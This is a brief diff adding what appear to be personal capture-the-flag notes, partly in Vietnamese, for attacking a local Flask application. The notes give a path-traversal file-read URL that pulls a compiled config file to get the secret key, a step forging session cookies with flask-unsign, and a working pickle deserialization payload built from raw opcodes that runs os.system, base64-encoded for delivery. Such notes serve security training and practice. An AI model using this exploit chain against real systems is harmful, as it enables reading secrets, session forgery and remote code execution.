@@ -1,0 +1,17 @@
+*****************
+-Lfi de doc secret key
+http://localhost:9000/file?f=../__pycache__/config.cpython-311.pyc
+so 311 mn co the brute-force.
+****************
+gen session bang flask unsign
+****************
+-Pickle rce 
+import base64
+opcode3=b'''(cos
+system
+S'sleep 7'
+o'''
+print(base64.b64encode(opcode3))
+a = base64.b64encode(opcode3)
+b = base64.b64decode(a)
+print(b)
